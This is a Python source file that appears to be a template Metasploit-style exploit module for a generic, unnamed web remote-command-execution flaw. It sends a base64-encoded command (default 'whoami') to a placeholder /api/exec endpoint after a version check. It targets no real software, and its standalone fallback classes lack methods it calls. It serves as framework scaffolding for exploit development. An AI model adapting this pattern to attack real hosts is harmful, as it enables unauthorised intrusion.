#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Generic RCE Example (2024) - Python Module Template

This is a template demonstrating the Python module framework for
post-2020 exploits in the Python-native Metasploit Framework.
"""

import logging
import json
import base64
from typing import Optional
import sys
import os

# Add lib path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../lib'))

# Try to import optional dependencies
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True

try:
    from metasploit import module
    from msf.http_client import HTTPClient, CheckCode
except ImportError:
    # Fallback for when running standalone
    class module:
        @staticmethod
        def run(metadata, callback):
            logging.basicConfig(level=logging.INFO)
            # Simple CLI mode
            args = {
                'rhost': '192.168.1.100',
                'rport': 8080,
                'targeturi': '/',
                'payload': 'whoami',
                'ssl': False
            }
            callback(args)
    
    class CheckCode:
        UNKNOWN = 'unknown'
        SAFE = 'safe'
        APPEARS = 'appears'
        VULNERABLE = 'vulnerable'
    
    class HTTPClient:
        def __init__(self, rhost, rport, ssl=False):
            self.base_url = f"http://{rhost}:{rport}"
        
        def get(self, uri, **kwargs):
            return None


metadata = {
    'name': 'Generic HTTP RCE Example (Post-2020 Template)',
    'description': '''
        This is a template module demonstrating the Python framework
        for converting post-2020 exploits from Ruby to Python.
        
        It shows proper structure, error handling, vulnerability checking,
        and exploitation patterns for web application vulnerabilities.
    ''',
    'authors': [
        'Python Conversion Team',
        'Metasploit Framework Contributors'
    ],
    'date': '2024-01-01',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': '2024-XXXXX'},
        {'type': 'url', 'ref': 'https://example.com/advisory'},
        {'type': 'url', 'ref': 'https://github.com/example/poc'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {
            'platform': 'unix',
            'arch': 'cmd',
            'name': 'Unix Command'
        },
        {
            'platform': 'linux',
            'arch': 'x64',
            'name': 'Linux x64'
        },
        {
            'platform': 'windows',
            'arch': 'x64',
            'name': 'Windows x64'
        }
    ],
    'payload': {
        'command_stager_flavor': 'wget',
    },
    'options': {
        'rhost': {
            'type': 'address',
            'description': 'Target address',
            'required': True,
            'default': None
        },
        'rport': {
            'type': 'port',
            'description': 'Target port',
            'required': True,
            'default': 8080
        },
        'targeturi': {
            'type': 'string',
            'description': 'Base path to vulnerable application',
            'required': True,
            'default': '/'
        },
        'ssl': {
            'type': 'bool',
            'description': 'Use SSL/TLS for connection',
            'required': False,
            'default': False
        }
    },
    'notes': {
        'stability': ['CRASH_SAFE'],
        'reliability': ['REPEATABLE_SESSION'],
        'side_effects': ['IOC_IN_LOGS', 'ARTIFACTS_ON_DISK']
    },
    'disclosure_date': '2024-01-01',
    'privileged': False,
    'stance': 'aggressive'
}


def check_vulnerability(client: HTTPClient, target_uri: str) -> str:
    """
    Check if target is vulnerable.
    
    Args:
        client: HTTP client instance
        target_uri: Base URI path
        
    Returns:
        CheckCode constant indicating vulnerability status
    """
    try:
        # Send check request
        check_uri = client.normalize_uri(target_uri, 'api', 'version')
        response = client.get(check_uri)
        
        if not response:
            logging.error("Failed to connect to target")
            return CheckCode.UNKNOWN
        
        logging.info(f"Target responded with status code: {response.status_code}")
        
        # Check for vulnerable version in response
        if response.status_code == 200:
            try:
                data = response.json()
                version = data.get('version', '')
                
                # Example: check if version is vulnerable
                if version and version.startswith('1.0'):
                    logging.info(f"Found vulnerable version: {version}")
                    return CheckCode.VULNERABLE
                elif version:
                    logging.info(f"Found version: {version} (not vulnerable)")
                    return CheckCode.SAFE
                else:
                    logging.warning("Could not determine version")
                    return CheckCode.APPEARS
                    
            except (json.JSONDecodeError, KeyError):
                logging.debug("Response is not JSON or missing version field")
                return CheckCode.APPEARS
        
        return CheckCode.SAFE
        
    except Exception as e:
        logging.error(f"Vulnerability check failed: {e}")
        return CheckCode.UNKNOWN


def exploit_target(client: HTTPClient, target_uri: str, payload: str) -> bool:
    """
    Exploit the vulnerability.
    
    Args:
        client: HTTP client instance
        target_uri: Base URI path
        payload: Command payload to execute
        
    Returns:
        True if exploitation succeeded, False otherwise
    """
    try:
        # Build exploit request
        exploit_uri = client.normalize_uri(target_uri, 'api', 'exec')
        
        # Encode payload (example: base64)
        encoded_payload = base64.b64encode(payload.encode()).decode()
        
        # Prepare exploit data
        exploit_data = {
            'command': encoded_payload,
            'encoding': 'base64'
        }
        
        logging.info(f"Sending exploit to {exploit_uri}")
        logging.debug(f"Payload: {payload}")
        
        # Send exploit
        response = client.post(
            exploit_uri,
            data=json.dumps(exploit_data),
            headers={'Content-Type': 'application/json'}
        )
        
        if not response:
            logging.error("Exploit request failed - no response")
            return False
        
        logging.info(f"Exploit response status: {response.status_code}")
        
        # Check if exploitation succeeded
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    logging.info("✓ Exploitation successful!")
                    if 'output' in result:
                        logging.info(f"Command output:\n{result['output']}")
                    return True
                else:
                    error = result.get('error', 'Unknown error')
                    logging.error(f"Exploitation failed: {error}")
                    return False
            except json.JSONDecodeError:
                logging.warning("Response is not JSON, assuming success")
                return True
        else:
            logging.error(f"Unexpected status code: {response.status_code}")
            return False
            
    except Exception as e:
        logging.error(f"Exploitation failed with exception: {e}")
        return False


def run(args):
    """
    Module entry point.
    
    Args:
        args: Module arguments dictionary
    """
    # Setup logging
    log_prefix = f"{args['rhost']}:{args['rport']} - "
    module.LogHandler.setup(msg_prefix=log_prefix)
    
    # Check dependencies
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        logging.error('Install with: pip3 install requests')
        return
    
    # Extract arguments
    rhost = args['rhost']
    rport = args['rport']
    target_uri = args.get('targeturi', '/')
    ssl = args.get('ssl', False)
    payload = args.get('payload', 'whoami')  # From command stager
    
    logging.info(f"Starting exploitation of {rhost}:{rport}")
    logging.info(f"Target URI: {target_uri}")
    
    # Create HTTP client
    try:
        client = HTTPClient(rhost=rhost, rport=rport, ssl=ssl)
    except Exception as e:
        logging.error(f"Failed to create HTTP client: {e}")
        return
    
    # Check if target is vulnerable
    logging.info("Checking if target is vulnerable...")
    check_result = check_vulnerability(client, target_uri)
    
    if check_result == CheckCode.SAFE:
        logging.warning("Target does not appear to be vulnerable")
        return
    elif check_result == CheckCode.UNKNOWN:
        logging.warning("Could not determine if target is vulnerable")
        logging.info("Attempting exploitation anyway...")
    elif check_result == CheckCode.VULNERABLE:
        logging.info("✓ Target is vulnerable!")
    else:
        logging.info("Target appears to be vulnerable")
    
    # Attempt exploitation
    logging.info("Attempting exploitation...")
    success = exploit_target(client, target_uri, payload)
    
    if success:
        logging.info("✓ Exploitation completed successfully!")
        module.report_vuln(
            rhost,
            name='Generic RCE 2024',
            info='Successfully exploited vulnerability'
        )
    else:
        logging.error("✗ Exploitation failed")
    
    # Cleanup
    client.close()


if __name__ == '__main__':
    # Allow standalone execution for testing
    module.run(metadata, run)
